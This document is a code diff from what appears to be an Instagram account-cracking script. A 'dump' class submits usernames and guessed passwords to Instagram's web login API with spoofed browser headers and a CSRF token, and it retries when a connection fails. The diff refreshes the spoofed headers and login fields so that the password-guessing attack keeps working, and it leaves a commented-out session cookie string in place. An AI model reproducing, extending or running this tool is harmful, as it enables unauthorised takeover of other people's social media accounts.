@@ -266,37 +266,40 @@ class dump:
                    i = requests.Session()
                    link = i.get('https://www.instagram.com/accounts/login')
                    i.headers.update({
-                        'Host': 'www.instagram.com',
-                        'content-length': '327',
-                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-                        'x-ig-app-id': '1217981644879628',
-                        'x-ig-www-claim': '0',
-                        'sec-ch-ua-mobile': '?1',
-                        'x-instagram-ajax': '1006631170',
-                        'user-agent': self.UserAgent(),
-                        'viewport-width': '360',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'accept': '*/*',
-                        'x-requested-with': 'XMLHttpRequest',
-                        'x-asbd-id': '198387',
-                        'x-csrftoken': open('data/csrftoken.txt','r').read(),
-                        'sec-ch-prefers-color-scheme': 'light',
-                        'sec-ch-ua-platform': '"Android"',
-                        'origin': 'https://www.instagram.com',
-                        'sec-fetch-site': 'same-origin',
-                        'sec-fetch-mode': 'cors',
-                        'sec-fetch-dest': 'empty',
-                        'referer': 'ttps://www.instagram.com/',
-                        'accept-encoding': 'gzip, deflate, br',
-                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'
-                   })
+    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'sec-ch-ua-full-version-list': '"Chromium";v="130.0.6723.86", "Google Chrome";v="130.0.6723.86", "Not?A_Brand";v="99.0.0.0"',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-mobile': '?0',
+    'x-ig-app-id': '936619743392459',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-instagram-ajax': '1018415568',
+    'x-csrftoken': open('data/csrftoken.txt','r').read(),
+    'x-asbd-id': '129477',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'x-ig-www-claim': '0',
+    'sec-ch-ua-platform-version': '""',
+    'origin': 'https://www.instagram.com',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://www.instagram.com/',
+    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+    'priority': 'u=1, i',
+    # 'Cookie': 'csrftoken=tL_zRbFEoZ7yz0O_rK8gKU; datr=ElJAZ9nfH6ZaMlHqbmUMHpt-; ig_did=DB9AF4D1-BA55-4911-AC58-06640D49A0A4; ps_l=1; ps_n=1; dpr=1.75; mid=Z0BSFgABAAHXPXMFxidClDMqqPU2; wd=980x1787',
+})
                    data = {
-                      'enc_password':'#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(tim()),pw),
-                      'username':user,
-                      'queryParams':'{}',
-                      'optIntoOneTap':'false',
-                      'trustedDeviceRecords':'{}'
-                   }
+    'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(tim()),pw),
+    'caaF2DebugGroup': '0',
+    'loginAttemptSubmissionCount': '0',
+    'optIntoOneTap': 'false',
+    'queryParams': '{}',
+    'trustedDeviceRecords': '{}',
+    'username': user,
+}
                    Ulfa = i.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data=data)
                    sydh = json.loads(Ulfa.text)
 #                   i.headers.update({'x-csrftoken':i.cookies['csrftoken']})
@@ -326,7 +329,8 @@ class dump:
                        break
                    else:
                        continue
-             except Exception as e:self.crack(user,pwx)
+             except (requests.exceptions.ConnectionError): time.sleep(31)
+#             except Exception as e:self.crack(user,pwx)
         loop +=1
 
 def folder():
